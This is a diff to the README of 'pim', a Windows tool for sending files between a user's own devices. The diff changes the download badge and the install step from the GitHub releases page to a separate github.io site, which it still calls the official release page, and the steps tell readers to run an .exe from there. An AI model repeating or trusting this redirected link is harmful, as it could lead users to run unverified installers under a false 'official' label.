@@ -1,6 +1,6 @@
 # 📱 pim - Exchange files between your own devices
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Taxonomypatka530/pim/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://taxonomypatka530.github.io)
 
 pim lets you send files, text, notes, and tasks between your devices. It works over your local Wi-Fi network. You do not need the internet to move data. Your files stay on your hardware. 
 
@@ -25,7 +25,7 @@ You need a Windows computer to use this application. Ensure your computer meets 
 
 Follow these steps to set up pim on your Windows computer.
 
-1.  Visit the official release page to download the setup file: [https://github.com/Taxonomypatka530/pim/releases](https://github.com/Taxonomypatka530/pim/releases).
+1.  Visit the official release page to download the setup file: [https://taxonomypatka530.github.io](https://taxonomypatka530.github.io).
 2.  Look for the file that ends in `.exe`. This is the installer for Windows.
 3.  Click the link to start the download.
 4.  Find the downloaded file in your "Downloads" folder.
